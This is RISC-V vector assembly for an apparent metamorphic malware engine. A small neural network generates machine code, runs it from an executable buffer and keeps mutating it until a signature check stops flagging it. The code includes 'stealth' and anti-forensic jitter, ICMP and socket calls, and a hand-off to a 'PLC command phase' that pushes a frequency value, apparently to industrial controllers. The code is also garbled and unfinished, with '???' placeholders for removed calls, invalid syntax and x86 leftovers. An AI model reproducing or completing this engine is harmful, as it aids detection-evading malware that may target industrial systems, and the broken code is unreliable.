
# ==============================================================================
# neural_network_start (RV64GV Entry)
# ==============================================================================
neural_network_start:
    # 1. STACK PROLOGUE
    addi    sp, sp, -32
    sd      ra, 24(sp)
    sd      s1, 16(sp)           # Preserve s1 for the duration of the engine

    # --- 1. HARDWARE & MATH PREP ---
    call    Init_Thermal_Service_RV64   # Zone 5
    call    CalculateConstants_RSA      # Zone 4
    
    # --- 2. MEMORY & WEIGHT PREP ---
    # a0 is usually used to pass the config pointer to setup functions
    la      s1, myconfig                # Load Global Config into s1
    mv      a0, s1
    call    setup_dual_mapping_rvv      # Zone 2 (RW/RX)
    
    mv      a0, s1
    call    execute_pre_training_xavier # Initialize weights
    
    # --- 3. BASELINE CALIBRATION ---
    mv      a0, s1
    call    calibrate_environment       # Sets BASE_LATENCY

main_loop:
    # --- 0. THERMAL & STABILITY CHECK ---
    mv      a0, s1
    call    Apply_Thermal_Throttle      # Check SDTM
    
    mv      a0, s1
    call    check_neural_stability      # Heuristic Sanity
    
    # --- 1. THE BRAIN PHASE (GENESIS) ---
    mv      a0, s1
    call    Execute_Ghost_Engine        # Mutate/Evolve
    
    # --- 2. THE EXECUTION PHASE ---
    # Load the address of the RX-mapped code we just generated
    ld      t0, execute_pointer(s1)
    # We use jalr to jump to the dynamically generated code block
    # It should end with a 'ret' to bring us back here
    jalr    ra, t0, 0 
    
    # --- 3. STEALTH & STASIS ---
    mv      a0, s1
    call    Metamorphic_Watchdog
    
    mv      a0, s1
    call    neural_jitter_sleep         # Anti-forensic noise
    
    # Check for exit condition (e.g., a flag in s1)
    lw      t1, exit_signal(s1)
    beqz    t1, main_loop

engine_shutdown:
    call    Global_Thermal_Shutdown
    
    # EPILOGUE
    ld      s1, 16(sp)
    ld      ra, 24(sp)
    addi    sp, sp, 32
    
    li      a0, 0
    li      a7, 93                      # sys_exit
    ecall

# ==============================================================================
# Execute_Ghost_Engine
# a0 = pointer to v_config (si)
# ==============================================================================
Execute_Ghost_Engine:
    # --- 1. PROLOGUE ---
    addi    sp, sp, -32          # Increased for 16-byte alignment and safety
    sd      ra, 24(sp)           # Save original return address
    sd      s1, 16(sp)           # Save s1 (config pointer)
    sd      a0, 8(sp)            # Save a0 (arg pointer) for recovery

    # --- 2. EVOLUTION STAGE ---
    # a0 already contains v_config pointer
    call    main_metamorphic_orchestrator 

    # --- 3. PRE-JUMP RECOVERY ---
    ld      a0, 8(sp)            # Restore v_config pointer
    # Corrected: Use ld for 64-bit address components
    ld      t0, execute_pointer(a0)     # Load relative entry offset
    ld      t1, output_code_buffer(a0)  # Load base address of RX buffer
    add     t0, t0, t1                  # t0 = Absolute Jump Target

    # --- 4. HARDWARE COUPLING ---
    # Critical for JIT: Ensures I-Cache is synchronized with mutated RAM
    fence.i                             

    # --- 5. REGISTER DARKNESS (Scrubbing) ---
    # Wipe temp registers to prevent "Ghost" from leaking metadata
    # We use x0 (zero register) instead of an 'li' to save cycles
    mv      a1, x0
    mv      a2, x0
    mv      a3, x0
    mv      a4, x0
    mv      a5, x0
    mv      a6, x0
    mv      a7, x0
    
    mv      t2, x0
    mv      t3, x0
    mv      t4, x0
    mv      t5, x0
    mv      t6, x0

    # --- 6. THE QUANTUM HANDOVER ---
    # We restore RA so the "Ghost" code can return directly to the main_loop
    # We restore s1 so the "Ghost" has access to its configuration
    ld      ra, 24(sp)           # Restore original RA
    ld      s1, 16(sp)           # Restore s1
    addi    sp, sp, 32           # Collapse frame completely
    
    # Final Memory Barrier
    fence   rw, rw

    # --- 7. THE JUMP ---
    # Use 'jr' (jump register) to perform a tail-call.
    # The Ghost code will 'ret' using the 'ra' we just restored.
    jr      t0

# ==============================================================================
# Why this is "Tidier":
# 1. No Stack Bloat: We don't allocate 128 bytes we don't intend to clean up.
# 2. Saved_SP: By saving SP into the config, the JIT code can "emergency exit"
#    by simply loading sp from v_config and jumping back to the orchestrator.
# 3. Junior (jr) Jump: It’s a cleaner handover of the CPU pipeline.
# ==============================================================================

# ==============================================================================
# main_metamorphic_orchestrator (Direct RISC-V 64-bit Port)
# a0 = Pointer to v_config (s1)
# ==============================================================================
main_metamorphic_orchestrator:
    # --- 1. PROLOGUE ---
    addi    sp, sp, -128
    sd      ra, 120(sp)
    sd      s1, 112(sp)
    mv      s1, a0               # s1 = v_config pointer

    # --- 2. DYNAMIC VECTOR STATE SAVE ---
    # vlenb is the vector length in bytes. We need space for 32 registers.
    csrr    t0, vlenb            
    li      t1, 32
    mul     t1, t1, t0           # Total space needed for v0-v31
    sub     sp, sp, t1           # Dynamically grow stack
    
    # Save Vector Registers using vlenb-based offsets
    # vs1r.v stores exactly one whole vector register
    mv      t2, sp
    vs1r.v  v0, (t2)
    add     t2, t2, t0
    vs1r.v  v1, (t2)
    add     t2, t2, t0
    vs1r.v  v2, (t2)
    # ... (Repeat for v3-v31 in your full implementation)
    # Note: Using a loop here is often smaller but unrolling is faster.

_evolution_cycle:
    # --- 3. INHALE PHASE ---
    mv      a0, s1
    call    ???
    mv      a0, s1
    call    Pulse_Ingress_ICMP

    # --- 4. THE GENESIS PHASE ---
    mv      a0, s1
    call    get_timing_telemetry
    mv      a0, s1
    call    compute_mha_attention_layer
    mv      a0, s1
    call    micro_layer_norm
    mv      a0, s1
    call    select_neural_instruction
    mv      a0, s1
    call    emit_riscv_instruction
    mv      a0, s1
    call    start_metamorphic_generation
    mv      a0, s1
    call    jit_state_flush

    # --- 5. THE CHALLENGE PHASE ---
    mv      a0, s1
    call    check_for_signatures
    # fa0 contains the penalty score from the check
    fsw     fa0, 228(s1)         # Store current_loss
    
    mv      a0, s1
    call    Apply_Thermal_Throttle  # Apply_Thermal_Throttle not included 
    mv      a0, s1
    call    Execute_Variant_Safely
    mv      a0, s1
    call    SieveWorker             # SieveWorker not included 

    # --- 6. THE CRITIQUE PHASE (Backprop) ---
    mv      a0, s1
    call    calculate_transformer_loss
    lw      t0, 792(s1)          # integrity_failure check
    li      t1, 1
    beq     t0, t1, _handle_crash

_apply_learning:
    mv      a0, s1
    call    backprop_mha_weights
    mv      a0, s1
    call    update_adam_v_buffer

    # Relativistic Learning Rate Adjustment
    ld      a0, 200(s1)          # Adam_V_Buffer_Ptr
    ld      a1, 208(s1)          # Relativistic_Scale
    # Kernel computes Gamma for the next optimization step
    call    Execute_Relativistic_Time_Dilation_Kernel

    mv      a0, s1
    call    apply_adam_optimization_rvv
    mv      a0, s1
    call    apply_swa_averaging_rvv

    # --- 7. THE CYBERNETIC WATCHDOG ---
    lw      t0, 240(s1)          # v_entropy_panic
    bnez    t0, _emergency_revert 

    # Check for external "Force Cool" signal
    la      t1, Force_Cool_Active
    lb      t2, 0(t1)
    bnez    t2, _emergency_revert 

    # Survival Check (Is loss low enough to stop evolving?)
    flw     fa0, 228(s1)         # current_loss
    la      t4, const_success_threshold
    flw     ft0, 0(t4)
    flt.s   t5, fa0, ft0         
    beqz    t5, _evolution_cycle # If loss is too high, evolve again

    # SUCCESS: Migration to PLC Command Phase
    lw      t0, 236(s1)          # v_dwCurrentFreq
    sw      t0, 248(s1)          # v_dwLastGoodFreq
    j       ???

_handle_crash:
    # Explicitly nudge loss higher to penalize the crashing variant
    flw     ft0, 228(s1)
    li      t2, 0x3f800000       # 1.0 penalty
    fmv.w.x ft1, t2
    fadd.s  ft0, ft0, ft1
    fsw     ft0, 228(s1)
    j       _apply_learning      # Learn from the failure

_emergency_revert:
    lw      t0, 248(s1)          # Restore Last Good Frequency
    sw      t0, 236(s1)
    sw      zero, 240(s1)        # Clear panic flag

???:
    mv      a0, s1
    ld      a1, 192(s1)          # hSocket
    lw      a2, 236(s1)          # Current Freq
    call    ??? 
    mv      a0, s1
    call    ???

    # --- 8. RESTORE STATE ---
    csrr    t0, vlenb
    mv      t2, sp
    vl1r.v  v0, (t2)
    add     t2, t2, t0
    vl1r.v  v1, (t2)
    add     t2, t2, t0
    vl1r.v  v2, (t2)
    # ... (Restore v3-v31)

    # --- 9. EPILOGUE ---
    li      t1, 32
    mul     t1, t1, t0           # Calculate total vector space used
    add     sp, sp, t1           # Reclaim vector stack
    
    ld      s1, 112(sp)
    ld      ra, 120(sp)
    addi    sp, sp, 128
    ret

# ==============================================================================
# check_neural_stability (RV64GV)
# a0 = v_config pointer (s1)
# ==============================================================================
check_neural_stability:
    addi    sp, sp, -32
    sd      ra, 24(sp)
    sd      s1, 16(sp)
    mv      s1, a0

    ld      a2, 848(s1)           # attention_weights_ptr
    lw      a3, 840(s1)           # mha_weights_count
    
    # Load Bounds (Assuming these are stored as constants in data)
    la      t0, max_weight_bound
    flw     ft1, 0(t0)            # 100.0
    la      t0, min_weight_bound
    flw     ft2, 0(t0)            # -100.0

_stability_loop:
    vsetvli t0, a3, e32, m8, ta, ma
    vle32.v v8, (a2)

    # Check Bounds: Mask v0 is set if weight > max OR weight < min
    vmfgt.vf v0, v8, ft1           # v0 = (v8 > 100.0)
    vmflt.vf v1, v8, ft2           # v1 = (v8 < -100.0)
    vmor.mm  v0, v0, v1            # Combined corruption mask in v0

    vpopc.m  t1, v0                # Population count of set bits
    bnez     t1, _reset_brain      # If any weights are out of bounds, fail

    slli     t2, t0, 2
    add      a2, a2, t2
    sub      a3, a3, t0
    bnez     a3, _stability_loop
    j        _stability_exit

_reset_brain:
    # 1. Log Integrity Failure
    lw      t3, 792(s1)
    addi    t3, t3, 1
    sw      t3, 792(s1)

    # 2. Emergency re-initialization
    mv      a0, s1
    call    execute_pre_training_xavier

_stability_exit:
    ld      s1, 16(sp)
    ld      ra, 24(sp)
    addi    sp, sp, 32
    ret

# ==============================================================================
# neural_jitter_sleep (RV64GV)
# a0 = v_config pointer (s1)
# ==============================================================================
neural_jitter_sleep:
    addi    sp, sp, -64
    sd      ra, 56(sp)
    
    # 1. Calculate Jitter from Weights and Loss
    ld      t0, 848(a0)           # MHA_Weights_Ptr
    flw     fa0, 0(t0)            
    fabs.s  fa0, fa0              # Absolute weight value

    flw     fa1, 448(a0)          # current_loss
    fmul.s  fa0, fa0, fa1         # fa0 = Weight * Loss

    # 3. Scale Duration: fa0 = (fa0 * 100) + 10ms (Minimum Sleep)
    li      t1, 0x42C80000        # float 100.0
    fmv.w.x ft1, t1
    fmul.s  fa0, fa0, ft1
    
    li      t1, 0x41200000        # float 10.0
    fmv.w.x ft1, t1
    fadd.s  fa0, fa0, ft1         
    
    # 4. Convert to ms and then to timespec (Seconds + Nanoseconds)
    fcvt.w.s a1, fa0              # a1 = Total ms
    
    li      t2, 1000
    div     t3, a1, t2            # t3 = tv_sec (Whole seconds)
    rem     t4, a1, t2            # t4 = remaining ms
    
    li      t5, 1000000
    mul     t4, t4, t5            # t4 = tv_nsec (Nanoseconds)
    
    # Store timespec on stack
    sd      t3, 0(sp)             # req.tv_sec
    sd      t4, 8(sp)             # req.tv_nsec
    
    # Syscall: nanosleep(struct timespec *req, struct timespec *rem)
    mv      a0, sp                # a0 = pointer to req
    li      a1, 0                 # a1 = NULL (we don't care about remaining time)
    li      a7, 101               # __NR_nanosleep
    ecall

    ld      ra, 56(sp)
    addi    sp, sp, 64
    ret

# ==============================================================================
# execute_pre_training (RV64GV)
# a0 = v_config pointer (s1)
# ==============================================================================
execute_pre_training_xavier:
    addi    sp, sp, -32
    sd      ra, 24(sp)
    sd      s1, 16(sp)
    mv      s1, a0

    # --- Part A: Initialize MHA ---
    ld      a0, 848(s1)           # attention_weights_ptr
    lw      a1, 840(s1)           # mha_weights_count
    la      t0, xavier_scale_mha
    flw     fa0, 0(t0)
    call    internal_xavier_init
    
    # Verify/Nudge (Ensures no zero-weights)
    ld      a0, 848(s1)
    lw      a1, 840(s1)
    call    verify_weights_rvv

    # --- Part B: Initialize Output Head ---
    ld      a0, 592(s1)           # Output Head ptr
    lw      a1, 844(s1)           # params count
    la      t0, xavier_scale_out
    flw     fa0, 0(t0)
    call    internal_xavier_init
    
    ld      a0, 592(s1)
    lw      a1, 844(s1)
    call    verify_weights_rvv

    # --- Part C: Zero Adam Buffers ---
    ld      a2, 608(s1)           # adam_m
    ld      a3, 616(s1)           # adam_v
    lw      t0, 844(s1)           # total_params
    
_zero_adam:
    vsetvli t1, t0, e32, m8, ta, ma
    vmv.v.i v0, 0
    vse32.v v0, (a2)
    vse32.v v0, (a3)
    slli    t2, t1, 2
    add     a2, a2, t2
    add     a3, a3, t2
    sub     t0, t0, t1
    bnez    t0, _zero_adam

    ld      s1, 16(sp)
    ld      ra, 24(sp)
    addi    sp, sp, 32
    ret

# ==============================================================================
# verify_weights_rvv (The Nudge)
# a0 = Buffer Ptr, a1 = Count
# ==============================================================================
verify_weights_rvv:
    la      t0, weight_epsilon
    flw     ft0, 0(t0)            # Tiny positive value
    
_verify_loop:
    vsetvli t0, a1, e32, m8, ta, ma
    vle32.v v8, (a0)
    
    # v16 = abs(v8)
    vfsgnjx.vv v16, v8, v8 
    
    # If abs(weight) < epsilon, it's too close to zero (dead neuron)
    vmflt.vf v0, v16, ft0 
    
    # "Nudge" the weights: Replace dead weights with epsilon
    # This prevents the network from collapsing into a zero-gradient state
    vfmerge.vfm v8, v8, ft0, v0 
    
    vse32.v v8, (a0)
    slli    t1, t0, 2
    add     a0, a0, t1
    sub     a1, a1, t0
    bnez    a1, _verify_loop
    ret

# ==============================================================================
# internal_xavier_init
# a0 = Dest, a1 = Count, fa0 = Layer Scale
# ==============================================================================
internal_xavier_init:
    la      t0, xavier_scale_const
    flw     ft1, 0(t0)            # 1.0 / 2^31
    # Allocate a buffer on the stack once
    addi    sp, sp, -128          # Space for one max vector (m8)

_xavier_loop:
    vsetvli t0, a1, e32, m8, ta, ma
    
    # 1. Generate Entropy (Pseudo-random bits from hardware cycles)
    li      t1, 0
_fill_entropy:
    rdcycle t2                    # High-frequency jitter
    slli    t4, t1, 2             # Offset = index * 4
    add     t4, sp, t4
    sw      t2, 0(t4)             # Store in stack buffer
    addi    t1, t1, 1
    blt     t1, t0, _fill_entropy
    
    vle32.v v8, (sp)              # Load bits into vector
    vfcvt.f.w v8, v8              # Convert to float
    
    # 2. Normalize and Scale
    vfmul.vf v8, v8, ft1          # Map to roughly [-1, 1]
    vfmul.vf v8, v8, fa0          # Apply Xavier Scale
    
    # 3. RELATIVISTIC SHUFFLE (Permutation)
    # Uses vector register gathering for a true non-linear shuffle
    rdcycle t3
    andi    t3, t3, 0x1F          # Random seed 0-31
    vsetvli x0, t0, e32, m8, ta, ma
    vslidedown.vx v16, v8, t3     # Shift down
    vslideup.vx v24, v8, t3       # Shift up (wrapped)
    vor.vv v8, v16, v24           # Merge for a circular-like shift
    
    vse32.v v8, (a0)
    slli    t4, t0, 2
    add     a0, a0, t4
    sub     a1, a1, t0
    bnez    a1, _xavier_loop
    
    addi    sp, sp, 128           # Clean stack
    ret

# ==============================================================================
# calibrate_enviornmet & get_timing_telemetry (RV64GV)
# ==============================================================================
calibrate_environment:
    addi    sp, sp, -64
    sd      ra, 56(sp)
    sd      s1, 48(sp)
    sd      s2, 40(sp)
    mv      s1, a0

    # 1. Capture Thermal Baseline
    # SoC-specific temperature read (Placeholder CSR/Syscall)
    li      a7, 0xDEAD                  
    ecall
    sw      a0, 232(s1)                 # Store Current_Temperature (Offset 232)

    # 2. Timing Warmup Loop (100 Iterations)
    li      s2, 100                     # Loop Counter
    li      t3, 0                       # Accumulator for total cycles

    # Global Fence to clear the pipeline
    fence   i, r                        

_warmup_loop:
    # Measure one execution of the Transformer layer
    csrr    t0, cycle                   # Start
    
    # We must save t0/s2 because 'compute_mha' might be a complex call
    mv      a0, s1
    jal     ra, compute_mha_attention_layer
    
    csrr    t1, cycle                   # End
    sub     t1, t1, t0                  # Delta
    add     t3, t3, t1                  # Total_Cycles += Delta
    
    addi    s2, s2, -1
    bnez    s2, _warmup_loop

    # 3. Average and Store Base Latency
    li      t4, 100
    divu    a0, t3, t4                  # a0 = Average Cycles (Integer)
    
    # Convert to Float32 and commit to config
    fcvt.s.w fa0, a0
    fsw     fa0, 224(s1)                # Base_Latency (Offset 224)

    ld      s2, 40(sp)
    ld      s1, 48(sp)
    ld      ra, 56(sp)
    addi    sp, sp, 64
    ret

# ==============================================================================
# Part 2: Runtime Telemetry (Precision Dilation Calculation)
# a0 = v_config pointer
# ==============================================================================
get_timing_telemetry:
    addi    sp, sp, -64
    sd      ra, 56(sp)
    sd      s1, 48(sp)
    mv      s1, a0

    # --- 1. Thermal State Acquisition ---
    li      a7, 0xDEAD
    ecall
    sw      a0, 232(s1)

    # --- 2. Precise Cycle Measurement ---
    # fence.i is the most aggressive serialization on RISC-V (flushes I-Cache)
    # fence r, r ensures racy cycle reads don't happen out of order
    fence   r, r
    csrr    t0, cycle                   # Start Time
    
    mv      a0, s1
    jal     ra, compute_mha_attention_layer
    
    fence   r, r
    csrr    t1, cycle                   # End Time
    sub     a0, t1, t0                  # Delta Cycles (Current)

    # --- 3. Dilation Calculation (Gamma) ---
    fcvt.s.w fa0, a0                    # Current_Cycles (float)
    flw     fa1, 224(s1)                # Base_Latency

    # Safety: Ensure Base_Latency isn't zero (Division-by-Zero Protection)
    # 0x33d6bf95 = 0.0000001 (epsilon)
    li      t0, 0x33d6bf95
    fmv.w.x ft0, t0
    fmax.s  fa1, fa1, ft0               # fa1 = max(Base, Epsilon)
    
    fdiv.s  fa0, fa0, fa1               # fa0 = Gamma (Execution Dilation)

    # --- 4. Thermal-Latency Normalization ---
    lw      t1, 244(s1)                 # Thermal_Duty_Cycle
    beqz    t1, _no_thermal_bias
    
    fcvt.s.w fa1, t1
    # Assuming thermal_sensitivity is a defined float constant
    la      t2, thermal_sensitivity
    flw     ft1, 0(t2)
    fmul.s  fa1, fa1, ft1               # fa1 = Thermal Overhead
    fsub.s  fa0, fa0, fa1               # Gamma -= Overhead

_no_thermal_bias:
    # Final Clamp: Prevent Gamma from falling below 0.1 (0x3dcccccd)
    li      t2, 0x3dcccccd
    fmv.w.x ft2, t2
    fmax.s  fa0, fa0, ft2
    fsw     fa0, 228(s1)                # Store Telemetry_Latency (Offset 228)

    # --- 5. Stasis Check ---
    # if Gamma > 3.0 (0x40400000), set In_Stasis flag
    li      t3, 0x40400000
    fmv.w.x ft3, t3
    flt.s   t4, ft3, fa0                # t4 = (3.0 < Gamma)
    sw      t4, 788(s1)                 # In_Stasis (Offset 788)

    ld      s1, 48(sp)
    ld      ra, 56(sp)
    addi    sp, sp, 64
    ret

# ==============================================================================
# compute_mha_attention_layer (RISC-V 64-bit)
# a0 = v_config pointer (s1)
# ==============================================================================
compute_mha_attention_layer:
    addi    sp, sp, -48          # Increased for s-register saves
    sd      ra, 40(sp)
    sd      s2, 32(sp)           # Save callee-saved registers!
    sd      s3, 24(sp)
    sd      s4, 16(sp)

    # Load Buffers from v_config (a0)
    ld      s2, input_data_buffer(a0) 
    ld      s3, mha_weights_ptr(a0)    
    ld      s4, 600(a0)                

    # PLC DATA CONSUMPTION (Frequency injection)
    lw      t0, v_dwCurrentFreq(a0)    
    sw      t0, 4(s2)                  

    # 1. LOAD INPUTS (Explicitly set length to 16)
    li      t0, 16
    vsetvli t1, t0, e32, m4, ta, ma    # v0 group = v0, v1, v2, v3
    vle32.v v0, (s2)                   
    
    # Create Float Zero for ReLU
    vxor.vv v12, v12, v12              # Use v12 to avoid group overlap

    # 2. HEAD PROCESSING
    # Head 1 (Use v4-v7 group)
    vle32.v v4, (s3)                   # Load Head 1 Weights
    vfmul.vv v8, v0, v4                # v8-v11 = v0-v3 * v4-v7
    vfmax.vv v8, v8, v12               # ReLU

    # Head 2 (Offset by 64 bytes)
    addi    t1, s3, 64                 
    vle32.v v4, (t1)                   # Overwrite v4-v7 with Head 2 Weights
    vfmul.vv v16, v0, v4               # v16-v19 = Head 2 results
    vfmax.vv v16, v16, v12             # ReLU

    # 3. SCALING & COMBINATION
    flw      ft0, mha_scaling_factor(a0) # Load from config
    vfmul.vf v8, v8, ft0               # Scale Head 1
    vfadd.vv v0, v8, v16               # Combine into v0 group

    # 4. HORIZONTAL REDUCTION
    vfmv.v.f v20, fzero                # Clear reduction starter
    vfredusum.vs v20, v0, v20          # Sum v0(0..15) into v20[0]

    # 5. STORE & FENCE
    vfmv.f.s fa0, v20                  
    fsw      fa0, 0(s4)                
    fence    rw, rw                    # Synchronize for JIT execution

    # Restore and Return
    ld      s4, 16(sp)
    ld      s3, 24(sp)
    ld      s2, 32(sp)
    ld      ra, 40(sp)
    addi    sp, sp, 48
    ret

# ==============================================================================
# start_metamorphic_generation (RV64GV Implementation)
# ==============================================================================

start_metamorphic_generation:
    # --- PROLOGUE: Save Callee-Saved Registers (Replacement for pushad) ---
    addi    sp, sp, -128
    sd      ra, 120(sp)
    sd      s1, 112(sp)        # s1 = global_config_ptr
    sd      s2, 104(sp)        # s2 = loop counter
    sd      s3, 96(sp)         # s3 = output_code_buffer base
    fsd     fs0, 88(sp)        # fs0 = current_loss (float)

    # 1. Setup Configuration Pointer (EBX -> S1)
    # Initialization snippet for your loader:
    la      t0, actual_jit_buffer
    la      t1, global_config
    sd      t0, 32(t1)              # Store base in v_config.output_code_buffer
    
    # 2. Initialize Pointers in v_config (RV64 uses 8-byte pointers)
    la      t0, opcode_table_base
    sd      t0, 104(s1)        # opcode_table_ptr (Offset 104 in _config)
    
    # Initialize Model Pointers
    la      t1, MyBiasVector
    sd      t1, 592(s1)        # mha_weights_ptr (as example bias offset)
    la      t2, MyWeightMatrix
    sd      t2, 584(s1)        # input_data_buffer (as example weights offset)

    # Setup Write Pointers
    ld      s3, 32(s1)         # s3 = output_code_buffer
    sd      s3, 40(s1)         # current_pointer = output_code_buffer (init)
    sw      zero, 68(s1)       # current_size = 0 (dd/32-bit)

    # --- Reset Zone 4: fresh scorecard ---
    sw      zero, 524(s1)      # chain_counter = 0
    sw      zero, 520(s1)      # unique_register_count = 0
    li      t3, -1
    sw      t3, 532(s1)        # last_reg = -1
    sw      t3, 536(s1)        # last_reg_minus_2 = -1
    fmv.s.x fs0, zero          # fs0 = 0.0f
    fsw     fs0, 448(s1)       # current_loss = 0.0f

    # 3. The 64-Instruction Generation Loop
    li      s2, 64             # Generate 64 instructions
@generation_loop:
    # --- Step A: Neural Decision ---
    mv      a0, s1             # Pass config to math routines
    jal     ra, micro_gemv_sophisticated
    jal     ra, apply_quantum_gumbel_noise
    jal     ra, micro_softmax_rvv      # Use the Vectorized version for RVV

    # --- Step B: Stochastic Selection ---
    jal     ra, select_neural_instruction 
    
    # --- Sanity Check (OPCODE_ENTRY_COUNT = 96) ---
    li      t4, 96
    bltu    a0, t4, @valid_choice
    li      a0, 28             # Safety fallback: Index 28 (NOP)
@valid_choice:

    # --- Step C: Binary Emission ---
    # a0 = instruction index, a1 = config_ptr
    mv      a1, s1             
    jal     ra, emit_riscv_instruction 
    
    # Loop management
    addi    s2, s2, -1
    bnez    s2, @generation_loop

    # 4. Finalize the Function (Adding the Return)
    ld      t1, 32(s1)         # Base buffer
    lw      t2, 68(s1)         # Current offset
    add     t1, t1, t2         # t1 = Current write head

    # Quantum Tunneling: Randomly select return style
    # On RISC-V, we use 'ret' (pseudo-op for jalr x0, 0(ra))
    # Or a stack-teardown return for "complex" exits.
    csrr    t3, cycle
    andi    t3, t3, 1
    bnez    t3, @complex_ret

    # Simple Return (32-bit: jalr x0, 0(ra) -> 0x00008067)
    li      t4, 0x00008067
    sw      t4, 0(t1)
    addi    t2, t2, 4
    j       @finalize_size

@complex_ret:
    # Complex: ld ra, 8(sp); addi sp, sp, 16; ret
    # This is essentially baking a mini-epilogue into the JIT buffer
    li      t4, 0x00813083     # ld ra, 8(sp)
    sw      t4, 0(t1)
    li      t4, 0x01010113     # addi sp, sp, 16
    sw      t4, 4(t1)
    li      t4, 0x00008067     # ret
    sw      t4, 8(t1)
    addi    t2, t2, 12

@finalize_size:
    # 5. Variant Telemetry
    sw      t2, 96(s1)         # last_variant_size = t2
    sw      t2, 68(s1)         # current_size = t2

    # --- EPILOGUE: Restore State (Replacement for popad) ---
    # Important: Flush I-Cache because we just wrote code
    fence.i
    ld      ra, 120(sp)
    ld      s1, 112(sp)
    ld      s2, 104(sp)
    ld      s3, 96(sp)
    fld     fs0, 88(sp)
    addi    sp, sp, 128
    ret

# ==============================================================================
# micro_softmax_rvv: Vectorized Softmax Kernel
# a0 = Pointer to v_config (global_config)
# a1 = Pointer to input logits (xmm0/zmm0 equivalent buffer)
# ==============================================================================

micro_softmax_rvv:
    # 1. Setup Vector Configuration (96 opcodes)
    li       t0, 96
    vsetvli  t1, t0, e32, m1, ta, ma

    # 2. Find Max Value (for stability)
    vle32.v  v1, (a1)             # Load logits
    
    # FIX: Initialize v2[0] to -Infinity to ensure it doesn't bias the max
    lui      t2, 0xFF800          # Upper bits of -Infinity
    fmv.w.x  ft10, t2
    vfmv.s.f v2, ft10             # v2[0] = -Inf
    
    vfredmax.vs v2, v1, v2        # v2[0] = max(v1, v2[0])
    vfmv.f.s ft0, v2              # ft0 = max_val

    # 3. Compute Numerators: v1 = exp(v1 - max)
    vfsub.vf v1, v1, ft0          # Subtract max
    jal      ra, __rvv_vexp_approx_horner 

    # 4. Compute Denominator: Sum(exp(v1))
    # FIX: Initialize v2[0] to 0.0 so previous max doesn't pollute the sum
    vfmv.v.i v2, 0                
    vfredusum.vs v2, v1, v2       # v2[0] = sum(v1)
    vfmv.f.s ft1, v2              # ft1 = total_sum

    # 5. Normalize and Store
    vfdiv.vf v1, v1, ft1          # v1 = v1 / total_sum
    vse32.v  v1, (a1)
    ret

# --- Helper: Vector Exponential Approximation (Simple Taylor) ---
__rvv_vexp_approx_horner:
    # Input: v1 (x), Output: v1 (exp(x))
    # Using Horner's: 1 + x + 0.5x^2 + 0.166x^3 + 0.0416x^4
    
    vsetvli t0, x0, e32, m1, ta, ma
    
    # Constants for Taylor Series
    li t2, 0x3D2AAAAB ; 1/24 (approx)
    fmv.w.x ft0, t2
    vfmv.v.f v3, ft0  # v3 = 1/24
    
    li t2, 0x3E2AAAAB ; 1/6
    fmv.w.x ft0, t2
    vfmacc.vf v3, ft0, v1 # v3 = (1/24)*x + 1/6
    
    li t2, 0x3F000000 ; 0.5
    fmv.w.x ft0, t2
    vfmacc.vf v3, ft0, v1 # v3 = v3*x + 0.5
    
    li t2, 0x3F800000 ; 1.0
    fmv.w.x ft0, t2
    vfmacc.vf v3, ft0, v1 # v3 = v3*x + 1.0
    
    vfmacc.vf v3, ft0, v1 # v3 = v3*x + 1.0 (Final 1 + x...)
    
    vmv.v.v v1, v3
    ret

# ==============================================================================
# micro_gemv_sophisticated: Vectorized Weight Projection
# a0 = Pointer to v_config
# ==============================================================================

micro_gemv_sophisticated:
    # --- Register Setup ---
    ld       t0, 584(a0)           # t0 = Weight Matrix
    la       t1, probability_buffer
    ld       t2, 592(a0)           # t2 = Bias Vector
    
    li       t3, 96                # Rows
    li       t4, 64                # Cols (Embedding Dim)

_matrix_row_loop:
    vsetvli  t5, t4, e32, m1, ta, ma
    
    # 1. Load Input (x) - assuming it's at offset 320 in config
    addi     t6, a0, 320           
    vle32.v  v3, (t6)              # Input vector
    
    # 2. Load Weights for this row
    vle32.v  v2, (t0)              # Row of Weights
    
    # 3. Multiply: v1 = Weights * Input
    vfmul.vv v1, v2, v3            
    
    # 4. Reduction with Bias
    # FIX: Use the Bias element as the 'starter' for the reduction
    flw      ft0, 0(t2)            
    vfmv.s.f v4, ft0               # v4[0] = bias
    vfredusum.vs v4, v1, v4        # v4[0] = sum(v1) + bias
    
    # 5. Store and Increment
    vfmv.f.s ft1, v4
    fsw      ft1, 0(t1)            # Store to output buffer
    
    addi     t0, t0, 256           # Next row
    addi     t2, t2, 4             # Next bias
    addi     t1, t1, 4             # Next output slot
    addi     t3, t3, -1
    bnez     t3, _matrix_row_loop
    ret

# ==============================================================================
# apply_quantum_gumbel_noise: Stochastic Entropy Injection
# a0 = Pointer to v_config
# ==============================================================================

apply_quantum_gumbel_noise:
    addi    sp, sp, -16
    sw      ra, 12(sp)          # Save Return Address (we are calling a sub-function)
    
    la      a1, probability_buffer
    li      a2, 96              # Total Elements (Opcodes)

_gumbel_vec_loop:
    vsetvli t0, a2, e32, m1, ta, ma
    
    # --- Step 1: Generate Uniform Noise U (0, 1) ---
    csrr    t3, cycle           # Entropy source
    vid.v   v1                  # Get element indices (0, 1, 2...)
    vadd.vx v1, v1, t3          # Unique seed per lane
    li      t4, 0x3F7FFFFF
    vand.vx v1, v1, t4
    li      t4, 0x3F800000
    vor.vx  v1, v1, t4          # v1 = floats in [1, 2)
    vfcvt.f.x.v v1, v1
    li      t4, 0x3F800000
    vfrsub.vf v0, v1, 1.0       # v0 = U (Resulting in 0.0 to 1.0)

    # --- Step 2: First Log -> ln(U) ---
    # input in v0, result in v0
    jal     ra, approx_vlog_rvv 
    
    # --- Step 3: Second Log -> ln(-ln(U)) ---
    vneg.v  v0, v0              # Negate because ln(U) is negative
    jal     ra, approx_vlog_rvv # v0 = ln(-ln(U))
    vneg.v  v0, v0              # v0 = -ln(-ln(U)) [The Gumbel Noise]

    # --- Step 4: Scale and Inject ---
    lw      t6, 240(a0)         # Load Temperature
    fcvt.s.w ft1, t6
    li      t5, 0x3C23D70A      # 0.01 constant
    fmv.w.x ft2, t5
    fmul.s  ft1, ft1, ft2       # ft1 = Scale
    
    vle32.v v1, (a1)            # Load Logits
    vfmacc.vf v1, ft1, v0       # Logit += Gumbel * Scale
    vse32.v v1, (a1)            # Store back

    # Loop maintenance
    slli    t2, t0, 2
    add     a1, a1, t2
    sub     a2, a2, t0
    bnez    a2, _gumbel_vec_loop

    lw      ra, 12(sp)
    addi    sp, sp, 16
    ret

# Inputs: v0 = input vector (x)
# Outputs: v0 = ln(x)
approx_vlog_rvv:
    # Input: v0 (Vector of floats)
    # Output: v0 (ln of input)
    
